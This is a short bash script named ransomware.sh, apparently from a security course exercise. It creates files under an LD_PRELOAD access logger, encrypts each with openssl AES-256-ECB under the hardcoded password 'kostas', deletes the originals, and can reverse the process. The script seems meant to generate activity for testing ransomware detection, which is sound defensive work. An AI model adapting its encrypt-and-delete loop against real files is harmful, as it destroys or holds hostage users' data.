#!/bin/bash


function Create()
{

	LD_PRELOAD=./logger.so ./test_aclog "$x" "${dir}"
		
}

function Encrypt()
{
	for (( i=0; i<x; i++ ))
	do
		LD_PRELOAD=./logger.so openssl enc -aes-256-ecb -in ${dir}file$i -out ${dir}file$i.encrypt -k kostas
		rm ${dir}file$i
	done
}

function Decrypt()
{	
	for (( i=0; i<x; i++ ))
	do
		LD_PRELOAD=./logger.so openssl aes-256-ecb -in ${dir}file$i.encrypt -out ${dir}file$i -d -k kostas
		rm ${dir}file$i.encrypt
	done

}

function Checkargs()
{
	if [ $narg -ne 3 ]
	then
		echo "Error: Wrong arguments"
		echo "Run ./ransomware.sh -h for help messsage"
		exit 1
	fi

}


narg=$#
x=$2
dir=$3
cur=$(pwd)


case "$1" in
-e)
	#Create files
	Checkargs
	Create
	#Encrypt files
	Encrypt
	;;
-d)
	#Decrypt files
	Checkargs
	Decrypt
	;;
-h)
	#Help
	echo "Usage: ./ransomware.sh <flag> <num_of_files> <directory>"
	echo "Flags: 
	-e to encrypt
       	-d to decrypt
	For example: ./ransomware.sh -e 3 /home/kmylonas/Documents/"
	;;
*)
	Checkargs
	;;
esac

